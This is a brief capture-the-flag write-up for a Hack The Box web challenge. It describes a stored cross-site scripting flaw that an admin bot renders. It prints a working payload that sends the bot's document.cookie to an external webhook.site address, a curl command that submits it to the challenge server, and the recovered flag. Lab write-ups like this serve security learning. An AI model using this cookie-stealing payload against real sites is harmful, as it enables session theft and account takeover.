# Toy Workshop

## Challenge

We're given a link to a website with nothing to interact with.

Source code is provided.

## Solution

Inspecting the source, we can see some hidden routes, including one which accepts a POST request.

The request is stored in a database and later accessed by an admin bot.

We can inject javascript into this request so that when the bot visits it, it will leak the flag and send it to our webhook.

## Exploit

`payload.json`:

```json
{
    "query": "<script>fetch('https://webhook.site/e89ade46-1d87-4375-9672-381e5d2fd920?' + document.cookie)</script>"
}
```

`exploit.sh`:

```bash
#!/usr/bin/env bash

curl -X POST -H "Content-Type: application/json" --data @payload.json http://134.209.184.105:30556/api/submit
```

## Flag

`HTB{3v1l_3lv3s_4r3_r1s1ng_up!}`
